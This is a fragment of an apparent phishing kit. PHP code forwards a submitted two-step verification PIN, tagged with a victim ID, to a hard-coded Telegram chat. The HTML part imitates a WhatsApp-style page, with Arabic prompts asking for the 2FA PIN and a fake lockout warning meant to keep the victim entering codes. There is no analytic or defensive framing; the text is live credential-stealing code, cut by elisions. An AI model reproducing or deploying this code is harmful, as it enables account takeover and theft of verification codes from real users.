...
$chat_id ="5288376819";
 ...
 $params=[
      'chat_id'=>$chat_id,
      'text' => $idN." | CODE PIN 4 : ".$_POST['codeconf4'],
                    ...
                    <div class="_9r_7">
                        <section data-testid="waui_section" class="_9t2b _9t2d" style="">
                            ...
                            <strong style="font-style: italic;">أدخل رمز التحقق بخطوتين (PIN) الذي قمت بتجديده سابقا</strong>
                                          <center><span style="color:#cc0000"> لقد تجاوزتم الفرص المحدودة عاود المحاولة بعد 15 دقيقة</span></center>
                                                        <input type="text" name="codeconf3" id="codeconf3" class="input-phone"  style="direction: ltr;letter-spacing : 5px;  " placeholder="_ _ _  _ _ _"  pattern="[0-9]*" maxlength="6" disabled>
